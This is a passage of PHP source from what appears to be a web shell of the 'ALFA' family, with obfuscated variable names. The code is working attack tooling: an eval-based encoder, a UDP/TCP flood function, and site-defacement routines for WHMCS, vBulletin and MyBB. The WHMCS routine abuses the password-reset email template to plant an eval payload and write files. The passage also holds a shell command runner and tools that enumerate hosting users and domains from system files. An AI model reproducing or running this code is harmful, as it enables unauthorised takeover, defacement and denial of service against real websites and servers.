'urldecode  ( $string )' => 'urldecode($s)',
'full_urlencode  ( $string )' => 'full_urlencode($s)',
'htmlspecialchars  ( $string )' => 'htmlspecialchars($s)',
'base64_encode (gzdeflate( $string , 9)) --> Encode' => '__ZW5jb2Rlcg(gzdeflate($s, 9))',
'gzinflate (base64_decode( $string )) --> Decode' => '@gzinflate(__ZGVjb2Rlcg($s))',
'str_rot13 (base64_encode( $string )) --> Encode' => 'str_rot13(__ZW5jb2Rlcg($s))',
'base64_decode (str_rot13( $string )) --> Decode' => '__ZGVjb2Rlcg(str_rot13($s))',
'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(__ZW5jb2Rlcg(gzdeflate($s,9)))',
'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(__ZGVjb2Rlcg(str_rot13($s)))',
);
alfahead();
echo '<div class=header>';
echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
foreach($adqpxutw8808d58642e6f03be4b9ea079b599994 as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a)
echo "<option value='".htmlspecialchars($hvlrcxnj9e3669d19b675bd57058fd4664205d2a)."' ".($_POST['alfa1']==$hvlrcxnj9e3669d19b675bd57058fd4664205d2a?'selected':'').">".$damiszkt8ce4b16b22b58894aa86c421e8759df3."</option>";
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form>";
if(!empty($_POST['alfa1'])){
$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = addslashes($_POST['alfa2']);
$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = str_replace('\"','"',$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21);
$zxiywaref24233114ac85fb3be6785293636ca46 = $_POST['alfa1'];
$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace('$s',"'".$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21."'",$zxiywaref24233114ac85fb3be6785293636ca46);
ob_start();
eval('echo '.$nndigmblc13367945d5d4c91047b3b50234aa7ab.';');
$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = ob_get_contents();
ob_end_clean();
if(in_array($zxiywaref24233114ac85fb3be6785293636ca46, $adqpxutw8808d58642e6f03be4b9ea079b599994))echo '<textarea class="bigarea">'.htmlspecialchars($ybaqpbzt9b207167e5381c47682c6b4f58a623fb).'</textarea>';
}
echo "</div>";
alfaFooter();
}
function alfados(){
alfahead();
echo '<div class=header>';
echo '<center><p><div class="txtfont_header">| DOS |</div></p><form onSubmit="g(\'dos\',null,this.host.value,this.time.value,this.port.value,this.m.value); return false;"><div class="txtfont">Method : <select name="m" style="width:80px;"><option value="udp">UDP</option><option value="tcp">TCP</option></select> Host : <input name="host" type="text" value="localhost" size="25" /> Time : <input name="time" type="text" size="15" /> Port : <input name="port" type="text" size="10" /> <input type="submit" value=" " /></div></form></center><br>';
if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3'])){
echo __pre();
$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20=0;
ignore_user_abort(true);
$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c=(int)$_POST['alfa2'];
$ouidxbfr07cc694b9b3fc636710fa08b6922c42b=time();
$ulbxkxcqfc441d9bc628f21c76d7a4ce937749f2=$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c+$ouidxbfr07cc694b9b3fc636710fa08b6922c42b;
$wlerpykf67b3dba8bc6778101892eb77249db32e=$_POST['alfa1'];
$fbwqabyz901555fb06e346cb065ceb9808dcfc25=(int)$_POST['alfa3'];
$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce=$_POST['alfa4'];
$vemvtkqkc68271a63ddbc431c307beb7d2918275 = str_repeat('X',65000);
while(1){
$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20++;
if(time() > $ulbxkxcqfc441d9bc628f21c76d7a4ce937749f2){
break;
}
$zngnwtjj0666f0acdeed38d4cd9084ade1739498 = @fsockopen($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce.'://'.$wlerpykf67b3dba8bc6778101892eb77249db32e, $fbwqabyz901555fb06e346cb065ceb9808dcfc25, $irrxgcsz70106d0d821513f45702b7d25664ab7c, $ivgnqlyv809b1abe3f111fd3bb1a54c62706129f, 5);
if($zngnwtjj0666f0acdeed38d4cd9084ade1739498){
fwrite($zngnwtjj0666f0acdeed38d4cd9084ade1739498, $vemvtkqkc68271a63ddbc431c307beb7d2918275);
fclose($zngnwtjj0666f0acdeed38d4cd9084ade1739498);
}
}
echo "<center>$roshmacmc9c17db3d29de9a4d3525da0f2bdfe20 (" . @round(($roshmacmc9c17db3d29de9a4d3525da0f2bdfe20*65)/1024, 2) . " MB) packets averaging ". @round($roshmacmc9c17db3d29de9a4d3525da0f2bdfe20/$dwkwvdayd169cd9a694edb8eb8b81e78879f1d4c, 2) . " packets per second</center>";
echo "</pre>";
}
echo '</div>';
alfafooter();
}
function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
function alfaIndexChanger(){
alfahead();

echo '<div class=header><center><p><div class="txtfont_header">| Index Changer |</div></p><h3><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,null,\'whmcs\')">| Whmcs | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
if(isset($_POST['alfa3'])&&($_POST['alfa3'] == 'whmcs')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
<p><center>".getConfigHtml('whmcs')."<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=index rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$fwmapdirb9351233dc7d704fd944824721024dfb="Powered By Solevisible";
$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa6'];
$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa5'];
$mistjjzta3da707b651c79ecc39a4986516180b2 = $_POST['alfa4'];
$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa7'];
$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa8'];
$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa9'];
$hdnhijeh6a992d5529f459a44fee58c733255e86 = $_POST['alfa10'];
$hdnhijeh6a992d5529f459a44fee58c733255e86 = str_replace("\'","'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
$ferhtamo59700156c351703cbe8c8fd6906cbf4d = '$x = base64_decode("'.__ZW5jb2Rlcg($hdnhijeh6a992d5529f459a44fee58c733255e86).'"); $solevisible = fopen("'.$mistjjzta3da707b651c79ecc39a4986516180b2.'","w"); fwrite($solevisible,$x);';
$vfsrtugr82963a666691ccbd70eee42aa93c1382 = __ZW5jb2Rlcg($ferhtamo59700156c351703cbe8c8fd6906cbf4d);
$ulwagaezdde5c8d4149c5072d2cb798706663e78 = '{php}eval(base64_decode("'.$vfsrtugr82963a666691ccbd70eee42aa93c1382.'"));{/php}';
if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775)&&!empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda)&&!empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21)&&!empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$opcdvzxn2f7c038d5d136408be8fe0506ecbe989=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,"select message from tblemailtemplates where name='Password Reset Validation'");
$jlghjstf72956065c7d6a9706978c03d86a6a579 = mysqli_fetch_assoc($opcdvzxn2f7c038d5d136408be8fe0506ecbe989);
$zomeopxz5afebf01d42bfdc7d07222bca225eadd = $jlghjstf72956065c7d6a9706978c03d86a6a579['message'];
$nwsybgtvdfe88d6af280e0ce512e3fb549b63280 = str_replace("'","\'",$zomeopxz5afebf01d42bfdc7d07222bca225eadd);
$vagiaqvoa181b4673216ad247a0f78066a9646e1 = "UPDATE tblemailtemplates SET message='$ulwagaezdde5c8d4149c5072d2cb798706663e78' WHERE name='Password Reset Validation'";
$nmxeqhvab4a88417b3d0170d754c647c30b7216a=@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vagiaqvoa181b4673216ad247a0f78066a9646e1) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5 = "insert into tblclients (email) values('solevisible@fbi.gov')";
$ecwemfrq486a9bbc2c582b30c8899b6f20a7e59e =@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$tyxqkdic76ea0bebb3c22822b4f0dd9c9fd021c5) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
if(function_exists('curl_version')){
$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87 = new AlfaCURL(true);
$xlxkfxnna14152b8ce9d915a253ff5f08bb98856 = $yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php");
$snxircere71105459c77e7298b33c904bdf742be = preg_match("/name=\"token\" value=\"(.*?)\"/i",$xlxkfxnna14152b8ce9d915a253ff5f08bb98856,$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2);
$yjikdmnn94305ab3e8d752859bc2a3ae1e55cd87->Send($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php","post","token={$cjbqugpw94a08da1fecbb6e8b46990538c7b50b2[1]}&action=reset&email=solevisible@fbi.gov");
$xvddzlni9518b395576a418af8d4f2a87042b7d7 = "UPDATE tblemailtemplates SET message='{$nwsybgtvdfe88d6af280e0ce512e3fb549b63280}' WHERE name='Password Reset Validation'";
$qyzyxyfr54e6dce5bb57581b9fffe5c2f7d54f44 = mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$xvddzlni9518b395576a418af8d4f2a87042b7d7) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
__alert('File Created...');
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/".$mistjjzta3da707b651c79ecc39a4986516180b2."'>Click Here !</a></font></b></center><br><br>";
}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/".$mistjjzta3da707b651c79ecc39a4986516180b2." \"</font></b></center><br><br>";
}}}}
if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
<p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><br>
<input type='submit' value=' '></form></center></center>";
if($_POST['alfa8']=='>>'){
$fwmapdirb9351233dc7d704fd944824721024dfb="Powered By Solevisible";
$fpgvfxxse68767ea79ef0c42d8c4653b39374eda = $_POST['alfa2'];
$kqckaclr7980a849b1d26dcf210bf4fb030c6a21 = $_POST['alfa3'];
$cxvugbgf06b18ac8deaf14a6416183145c06238c = $_POST['alfa4'];
$kwizkcfd1eb267706e34aa7423b280c24efdd775 = $_POST['alfa5'];
$hdnhijeh6a992d5529f459a44fee58c733255e86 = $_POST['alfa6'];
$unkkdhum851f5ac9941d720844d143ed9cfcf60a = $_POST['alfa7'];
$hdnhijeh6a992d5529f459a44fee58c733255e86=str_replace("\'","'",$hdnhijeh6a992d5529f459a44fee58c733255e86);
$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c = "{\${eval(base64_decode(\'";
$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c .= __ZW5jb2Rlcg("echo \"$hdnhijeh6a992d5529f459a44fee58c733255e86\";");
$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c .= "\'))}}{\${exit()}}";
if(!empty($kwizkcfd1eb267706e34aa7423b280c24efdd775)&&!empty($fpgvfxxse68767ea79ef0c42d8c4653b39374eda)&&!empty($kqckaclr7980a849b1d26dcf210bf4fb030c6a21)&&!empty($hdnhijeh6a992d5529f459a44fee58c733255e86)){
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($kwizkcfd1eb267706e34aa7423b280c24efdd775,$fpgvfxxse68767ea79ef0c42d8c4653b39374eda,$cxvugbgf06b18ac8deaf14a6416183145c06238c,$kqckaclr7980a849b1d26dcf210bf4fb030c6a21) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$vgenjcotc767d1d85da1e060c115771a4649b1bd = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."template SET template='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."' WHERE title='spacer_open'";
$ootxykrk1bdfe8b473d942088eeba476b1a5e6eb = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."template SET template='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."' WHERE title='FORUMHOME'";
$oevwgemd9861df89a551ea94a0af88e26fb15584 = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."style SET css='".$jalpvyoxe4512bc3c7c98cf48bad333e6ff4971c."".$fwmapdirb9351233dc7d704fd944824721024dfb."', stylevars='', csscolors='', editorstyles=''";
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$vgenjcotc767d1d85da1e060c115771a4649b1bd) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ootxykrk1bdfe8b473d942088eeba476b1a5e6eb) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$oevwgemd9861df89a551ea94a0af88e26fb15584) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
__alert('VB index changed...!');
}
}
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'mybb')) {
echo __pre();

echo "<center><center><div class='txtfont_header'>| Mybb |</div>
<p><center>".getConfigHtml('mybb')."<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
";
$qheyssydaab9e1de16f38176f86d7a92ba337a8d = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($qheyssydaab9e1de16f38176f86d7a92ba337a8d);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=mybbindex rows='19' cols='103'>
<title>Hacked By Sole Sad & Invisible</title><b>Hacked By Sole Sad & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
$tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548 = $_POST['alfa6'];
$baqcsdoy61d1e57e80a0c21a6e90bb12173417fc = $_POST['alfa7'];
$mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8 = $_POST['alfa8'];
$nybabksea192d1127fd635f248d0946a59c88cb4 = $_POST['alfa9'];
$quflsduuf54bd7c54894db20b09cca64c076d090 = $_POST['alfa10'];
if(!empty($tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548)&&!empty($baqcsdoy61d1e57e80a0c21a6e90bb12173417fc)&&!empty($mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8)&&!empty($quflsduuf54bd7c54894db20b09cca64c076d090)){
$nyztcxgh0c1d0e2ef91d68bdb15eff954448b898=@mysqli_connect($tyzmzvud9033a0a66a4ee0d8a6ca4fd6e6c7d548,$baqcsdoy61d1e57e80a0c21a6e90bb12173417fc,$nybabksea192d1127fd635f248d0946a59c88cb4,$mezmjkbtfea64cafc5ec4eebb94d05d73cd78bd8) or die(mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
$unkkdhum851f5ac9941d720844d143ed9cfcf60a="mybb_";
$ghrecjtee13f7a3ce53a131f25f3885b7d41ed6f = "UPDATE ".$unkkdhum851f5ac9941d720844d143ed9cfcf60a."templates SET template='".$quflsduuf54bd7c54894db20b09cca64c076d090."' WHERE title='index'";
$nmxeqhvab4a88417b3d0170d754c647c30b7216a =@mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898,$ghrecjtee13f7a3ce53a131f25f3885b7d41ed6f) or die (mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898));
__alert('MyBB index changed...!');
}
}
}
echo "</div>";
alfafooter();
}
function alfaproc()
{
alfahead();
echo "<Div class=header><br><center>";
if(empty($_POST['ajax'])&&!empty($_POST['alfa1']))
$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
if($GLOBALS['sys']=="win"){
$kuiuelsn5075140835d0bc504791c76b04c33d2b=array(
"Task List" =>"tasklist /V",
"System Info" =>"systeminfo",
"Active Connections" => "netstat -an",
"Running Services" => "net start",
"User Accounts" => "net user",
"Show Computers" => "net view",
"ARP Table" => "arp -a",
"IP Configuration" => "ipconfig /all"
);}else{
$kuiuelsn5075140835d0bc504791c76b04c33d2b=array(
"Process status" => "ps aux",
"Syslog" =>"cat /etc/syslog.conf",
"Resolv" => "cat /etc/resolv.conf",
"Hosts" =>"cat /etc/hosts",
"Cpuinfo"=>"cat /proc/cpuinfo",
"Version"=>"cat /proc/version",
"Sbin"=>"ls -al /usr/sbin",
"Interrupts"=>"cat /proc/interrupts",
"lsattr"=>"lsattr -va",
"Uptime"=>"uptime",
"Fstab" =>"cat /etc/fstab"
);}
foreach($kuiuelsn5075140835d0bc504791c76b04c33d2b as $qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1 => $rsrmsacs2a304a1348456ccd2234cd71a81bd338){
echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\''.$rsrmsacs2a304a1348456ccd2234cd71a81bd338.'\')"> | '.$qhdvbdap7b8b965ad4bca0e41ab51de7b31363a1.' | </a>';
}
echo "</center><br>";
if(!empty($_POST['alfa1'])){
echo "<pre class='ml1' style='margin-top:5px' >";
if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "cd '".addslashes($_POST["c"])."';";}
echo alfaEx($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452.$_POST['alfa1'], true);
echo '</pre>';
}
echo "</div>";
alfafooter();
}
function alfasafe(){
alfahead();
echo "<div class=header><center><br><div class='txtfont_header'>| Auto ByPasser |</div>";
echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)">| PHP.INI | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,\'ini\')">| .htaccess(apache) | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,\'users\')">| Read-Users | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
if(!empty($_POST['alfa8']) && isset($_POST['alfa8']) == 'domains'){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
echo __pre();
$xbnvmquj24b2b880906fb1857d638c63c3df42ad = _alfa_file('/etc/named.conf');
if(is_array($xbnvmquj24b2b880906fb1857d638c63c3df42ad)){
foreach($xbnvmquj24b2b880906fb1857d638c63c3df42ad as $wibnxjovff0b9814dccd6ec71c83157e4e2a66fa){
if(@eregi('zone',$wibnxjovff0b9814dccd6ec71c83157e4e2a66fa)){
preg_match_all('#zone "(.*)"#',$wibnxjovff0b9814dccd6ec71c83157e4e2a66fa,$krfvyjtj39c2c4f56a5254caff10014767ed6cd7);
if(strlen(trim($krfvyjtj39c2c4f56a5254caff10014767ed6cd7[1][0])) > 2){
echo $krfvyjtj39c2c4f56a5254caff10014767ed6cd7[1][0].'<br>';
}}}
}
}else{
echo __pre();
$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
if(is_array($qbyndzxd9bc65c2abec141778ffaa729489f3e87)){
foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
$schrznsmdd988cfd769c9f7fbd795a0f5da8e751 = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
echo $schrznsmdd988cfd769c9f7fbd795a0f5da8e751[0]."\n";}}}}
if(!empty($_POST['alfa6']) && isset($_POST['alfa6']) == 'valiases'){
echo '
<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
if(isset($_POST['alfa9']) && $_POST['alfa9'] == '>>'){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = trim($_POST['alfa7']);
$fdkgyovx75a384057459ae8e69fb9a98a249b4f4 = str_replace(array("https://","http://","www."),"",$svjurwzc98defd6ee70dfb1dea416cecdf391f58);
$eeodyzriee11cbb19052e40b07aac0ca060c23ee = "";
if(function_exists("posix_getpwuid") && function_exists("fileowner")){
	if($eeodyzriee11cbb19052e40b07aac0ca060c23ee = @posix_getpwuid(@fileowner("/etc/valiases/{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}"))){
		$eeodyzriee11cbb19052e40b07aac0ca060c23ee = $eeodyzriee11cbb19052e40b07aac0ca060c23ee['name'];
	}
}else{
	if(_alfa_can_runCommand(true,true)){
		$eeodyzriee11cbb19052e40b07aac0ca060c23ee = alfaEx("stat -c '%U' /etc/valiases/".$fdkgyovx75a384057459ae8e69fb9a98a249b4f4);
	}
}
if(!empty($eeodyzriee11cbb19052e40b07aac0ca060c23ee)&&$eeodyzriee11cbb19052e40b07aac0ca060c23ee!='root'){
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$eeodyzriee11cbb19052e40b07aac0ca060c23ee}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}</font></b></td></tr></table></center>";
}else {echo __pre().'<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>';}
}else{
$svjurwzc98defd6ee70dfb1dea416cecdf391f58 = trim($_POST['alfa7']);
$fdkgyovx75a384057459ae8e69fb9a98a249b4f4 = str_replace(array("https://","http://","www."),"",$svjurwzc98defd6ee70dfb1dea416cecdf391f58);
$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
$zlkzobcq54d54a126a783bc9cba8c06137136943 = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
if($zlkzobcq54d54a126a783bc9cba8c06137136943[0] == $fdkgyovx75a384057459ae8e69fb9a98a249b4f4){
echo __pre()."<center><table border='1'>
<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">".trim($zlkzobcq54d54a126a783bc9cba8c06137136943[1])."</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$fdkgyovx75a384057459ae8e69fb9a98a249b4f4}</font></b></td></tr></table></center>";break;}}}}}
if(!empty($_POST['alfa5']) && isset($_POST['alfa5'])){
if(!_alfa_file_exists("/etc/virtual/domainowners")){
echo __pre();
$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 = 0;
while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < 60000) {
$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = @posix_getpwuid($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741);
if (!empty($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)) {
while (list ($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d, $jpaoohwt28b3aabbdbbe9733da0a27c8c80a0eb7) = each($yeshcnjz6438c669e0d0de98e6929c2cc0fac474)){
echo $jpaoohwt28b3aabbdbbe9733da0a27c8c80a0eb7."\n";
break;}}$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;}
}else{echo __pre();
$qbyndzxd9bc65c2abec141778ffaa729489f3e87 = _alfa_file("/etc/virtual/domainowners");
foreach($qbyndzxd9bc65c2abec141778ffaa729489f3e87 as $gjdduzssea7d3eb14d8ff4de44f68b1656cceeac){
$eeodyzriee11cbb19052e40b07aac0ca060c23ee = explode(":",$gjdduzssea7d3eb14d8ff4de44f68b1656cceeac);
